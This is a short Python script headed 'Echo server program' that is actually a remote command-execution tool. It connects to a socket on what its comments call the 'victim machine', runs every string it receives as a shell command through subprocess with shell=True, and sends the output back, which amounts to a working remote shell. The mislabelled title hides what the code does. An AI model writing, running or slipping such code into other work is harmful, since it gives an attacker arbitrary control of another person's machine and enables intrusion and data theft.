# Echo server program
import socket
import sys
import subprocess

# Replace the HOST and PORT with IP/PORT of victim machine
HOST = '0.0.0.0' # IP of victim machine
PORT = 50008   # Port of victim machine
s = None

# Ask the kernel for a newly-initialised (unbound) socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Force the socket to open after 
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# Creates a connection socket to the HOST/PORT of victim machine
s.connect((HOST, PORT))

while True:
        
    # Converts data to remove the end line
    data = s.recv(1024).strip()

    # Converts the byte format to string format
    str_data = str(data, 'UTF8')
        
    # Splits multiple strings into individual strings
    # str_array = str_data.split()
        
    # If the length of data is non-existent, then break
    if len(data) == 0:
        break

    # Create variable result that takes the array as input, allows for shell commands (can replace parameters with just str_array)
    result = subprocess.check_output(str_data, shell=True)

    # Send back the output in bytes format
    s.send(bytes(result))

# Close the connection socket
s.close()

print("bye")